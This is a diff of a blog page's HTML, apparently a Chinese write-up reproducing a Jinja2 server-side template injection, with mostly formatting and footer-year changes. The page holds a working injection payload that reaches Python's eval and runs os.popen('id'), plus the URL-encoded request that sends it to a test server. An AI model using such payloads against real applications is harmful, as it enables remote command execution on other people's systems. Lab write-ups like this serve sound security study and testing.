@@ -159,18 +159,18 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
-<span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}</span>
-  <span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">values</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
-  <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">b</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">==</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">%</span><span class="p">}</span>
-    <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">&#39;eval&#39;</span> <span class="ow">in</span> <span class="n">b</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
-      <span class="p">{{</span> <span class="n">b</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;id&#34;).read()&#39;</span><span class="p">)</span> <span class="p">}}</span>
-    <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
-  <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
-  <span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
-<span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
-<span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">values</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">b</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">==</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">&#39;eval&#39;</span> <span class="ow">in</span> <span class="n">b</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{{</span> <span class="n">b</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;id&#34;).read()&#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>访问<code>http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code>，得到执行结果：</p>
 <p><img
@@ -209,7 +209,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
